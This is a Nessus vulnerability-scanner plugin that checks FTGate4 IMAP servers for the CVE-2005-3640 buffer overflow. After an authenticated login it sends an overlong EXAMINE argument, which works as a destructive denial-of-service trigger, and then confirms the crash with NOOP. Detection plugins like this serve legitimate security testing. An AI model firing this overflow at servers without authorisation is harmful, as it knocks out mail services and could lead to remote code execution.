#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(20221);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2005-3640");
  script_bugtraq_id(15449);
  script_xref(name:"OSVDB", value:"20917");

  script_name(english:"FTGate4 IMAP EXAMINE Command Remote Overflow");
  script_summary(english:"Checks for buffer overflow vulnerability in FTGate IMAP server");

 script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is prone to a buffer overflow." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running a version of FTGate, a
commercial groupware mail server for Windows from FTGate Technology
Ltd. 

The version of FTGate installed on the remote host includes an IMAP
server that is prone to a buffer overflow vulnerability due to
boundary errors in its handling of various IMAP commands.  An
authenticated attacker can exploit this issue to crash the application
itself and possibly to execute arbitrary code subject to the
privileges of the SYSTEM user." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/416876/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://members.ftgate.com/f4/topic.asp?TOPIC_ID=7298" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to FTGate 4.4.002 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );
script_end_attributes();

 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Gain a shell remotely");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_dependencie("find_service1.nasl", "imap_overflow.nasl");
  script_require_keys("imap/login", "imap/password");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("global_settings.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) {
  exit(0, "imap/login and/or imap/password are empty");
}


# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);


# Read banner and make sure it looks like FTGate's.
s = recv_line(socket:soc, length:1024);
if (
  !strlen(s) || 
  "* OK IMAP4 IMAP4rev1 Server" >!< s
) {
  close(soc);
  exit(0);
}


# Try to log in.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}


# If successful, try to exploit the flaw.
if (resp && resp =~ "OK") {
  ++tag;
  resp = NULL;
  c = string("nessus", string(tag), " EXAMINE ", crap(500));
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }

  # If we didn't get a response, try to send a NOOP just to make sure it's down.
  if (isnull(resp)) {
    # Check if the daemon is hung.
    ++tag;
    resp = NULL;
    c = string("nessus", string(tag), " NOOP");
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
    }
    if (isnull(resp)) {
      security_hole(port);
      exit(0);
    }
  }
}
else if (resp =~ "NO") {
  debug_print("couldn't login with supplied IMAP credentials!", level:1);
}


# Logout.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}
close(soc);
